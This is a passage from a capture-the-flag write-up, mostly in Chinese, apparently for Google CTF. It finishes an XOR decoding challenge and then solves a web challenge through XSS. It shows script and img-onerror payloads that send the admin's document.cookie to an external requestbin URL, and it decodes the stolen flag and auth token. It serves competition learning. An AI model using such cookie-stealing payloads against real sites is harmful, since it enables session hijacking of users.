    ans = chr(part3[i] ^ primes[k3])
    print(ans,end="")
    k3 += 1
```

- 解出完整网址

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com
╰─➤  python3 test.py
http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/
```

- 此页面得flag:
<http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/amber.html>

- ==**flag:CTF{Peace_from_Cauli!}**==

## 08 Cookie World Order(web)

- <https://cwo-xss.web.ctfcompetition.com/> 有一聊天对话框，admin在线，使用xss攻击获取cookie
- 尝试注入，提示HACKER ALERT!，说明网站设置了部分语法限制

```jsp
<script>
location.href='http://requestbin.net/r/14bfl601?test='+document.cookie;
</script>
```

- 尝试利用上传img onerror进行注入，绕过了alert(参见https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

```jsp
<img src=x onerror="image = new Image(); image.src='http://requestbin.net/r/14bfl601?test='+btoa(document.cookie);">
```

- get request

```txt
test: ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==
```

- base64进行解码

```bash
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com
╰─➤  echo 'ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==' | base64 -d
flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
```

- ==**flag:CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}**==
